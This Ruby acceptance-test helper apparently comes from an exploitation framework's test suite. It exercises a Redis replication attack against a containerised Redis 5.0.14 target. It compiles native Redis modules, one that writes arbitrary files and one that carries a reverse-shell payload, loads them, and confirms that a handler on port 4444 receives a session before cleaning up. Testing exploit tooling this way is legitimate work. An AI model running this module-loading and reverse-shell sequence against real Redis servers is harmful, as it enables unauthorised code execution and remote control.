# frozen_string_literal: true

require_relative '../redis_replication/acceptance'

module Acceptance
  # Genuine SDK compilation and native handler gates for the default owner path.
  module RedisReplicationCustom
    include RedisReplication

    def rr_state
      keys = %w[dir dbfilename appendonly save protected-mode repl-diskless-sync]
      {
        config: keys.to_h { |key| [key, rr_cli('CONFIG', 'GET', key)] },
        modules: rr_cli('MODULE', 'LIST'),
        role: rr_cli('INFO', 'replication').lines.grep(/\A(?:role|master_host|master_port|connected_slaves):/),
        files: target_exec('target', 'ls', '-A1', '/data').lines.sort
      }
    end

    def rrc_compile(kind, argument = nil)
      artifacts = target_runtime.fetch('artifacts')
      invocation = "RedisCompiledControl.#{kind}(#{artifacts.inspect}#{argument ? ',' + argument.inspect : ''})"
      rr_json("begin;load 'test/module_targets/redis_replication_custom/compile_control.rb';#{invocation};end")
    end

    def rr_boot
      @rr = { native_commands: [], sessions: [], post_owner: [], custom: true }
      expect(rr_cli('INFO', 'server')).to include('redis_version:5.0.14')
      expect(rr_cli('PING')).to eq("PONG\n")
      @rr[:server] = rr_cli('INFO', 'server')
      @rr[:initial] = rr_state
      expect(@rr[:initial].fetch(:modules).strip).to eq('')
      @rr[:sdk_sources] = rr_json("begin;require 'digest';%w[module.erb Makefile redismodule.h].to_h{|name|[name,Digest::SHA256.file(File.join(Msf::Config.data_directory,'exploits','redis',name)).hexdigest]};end")
      @rr[:sdk_sources].each do |name, digest|
        expect(digest).to eq(Digest::SHA256.file(File.join('data/exploits/redis', name)).hexdigest)
      end
      @rr[:native_text] = rrc_compile('text')
      path = '/tmp/module-target-custom-text.so'
      rr_copy(@rr[:native_text].fetch('path'), path)
      expect(rr_cli('MODULE', 'LOAD', path)).to eq("OK\n")
      2.times do |index|
        file = "/tmp/module-target-custom-text-#{index}"
        value = "Native 'quote' \"double\" é λ 💥\r\nsecond line\n"
        begin
          target_exec('target', 'test', '!', '-e', file)
          expect(rr_cli('mcv.write', file, value)).to eq("OK\n")
          expect(target_exec('target', 'cat', file).b).to eq(value.b)
          expect(target_exec('target', 'stat', '-c', '%u', file).strip).to eq('999')
        ensure
          target_exec('target', 'rm', '-f', file)
        end
      end
      expect(rr_cli('MODULE', 'UNLOAD', 'mcvnativec')).to eq("OK\n")
      target_exec('target', 'rm', path)
      @rr[:native_module_passed] = true
      @rr[:observer] = rr_json("begin;require 'base64';require 'digest';load 'test/module_targets/laravel/session_control.rb';load 'test/module_targets/druid_sessions/session_control.rb';load 'test/module_targets/rocketmq_sessions/session_control.rb';DruidSessionControl.install(framework);end")
      rr_native_payload
      expect(rr_state).to eq(@rr.fetch(:initial))
      @rr[:baseline] = rr_state
      @rr[:native_controls_passed] = true
      rr_save
    ensure
      rr_save
    end

    def rr_native_payload
      console_command('use exploit/multi/handler')
      {
        'PAYLOAD' => RedisReplication::PAYLOAD, 'PrependFork' => true, 'LHOST' => listener_host, 'LPORT' => 4444,
        'ExitOnSession' => false, 'ReverseListenerBindAddress' => '0.0.0.0'
      }.each { |name, value| console_command("set #{name} #{value}") }
      expect(console_command('run -j -z')).not_to match(/Exploit failed|Exploit aborted/)
      raw = rr_json("begin;job=framework.jobs.values.find{|j|j.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;RocketmqSessionControl.command(job,#{RedisReplication::PAYLOAD.inspect});end")
      @rr[:native_payload] = raw
      @rr[:native_raw] = rrc_compile('raw', raw.fetch('command_base64'))
      path = '/tmp/module-target-custom-native.so'
      rr_copy(@rr[:native_raw].fetch('path'), path)
      expect(rr_cli('MODULE', 'LOAD', path)).to eq("OK\n")
      argv = target_runtime.fetch('compose') + ['exec', '-T', 'target', 'timeout', '30', 'redis-cli', '--raw', 'mcv.native']
      stdin, stdout, stderr, @rr_native_waiter = Open3.popen3(*argv)
      stdin.close
      @rr[:native_foreground] = { argv: argv, pid: @rr_native_waiter.pid }
      rr_use('exploit/multi/handler', 'native')
      expect(@rr_native_waiter.join(10)).not_to be_nil
      @rr[:native_foreground].merge!(exit: @rr_native_waiter.value.exitstatus,
                                     stdout_base64: Base64.strict_encode64(stdout.read),
                                     stderr_base64: Base64.strict_encode64(stderr.read))
      expect(@rr_native_waiter.value.success?).to be(true)
      expect(@rr[:native_foreground].fetch(:stdout_base64)).to eq(Base64.strict_encode64("OK\n"))
      expect(rr_cli('MODULE', 'UNLOAD', 'mcvnativeraw')).to eq("OK\n")
    ensure
      console_command('sessions -K')
      console_command('jobs -K')
      if @rr_native_waiter&.alive?
        Process.kill('TERM', @rr_native_waiter.pid)
        @rr_native_waiter.join(5)
      end
      stdout&.close
      stderr&.close
      target_exec('target', 'rm', '-f', path) if path
      rr_save
    end
  end
end
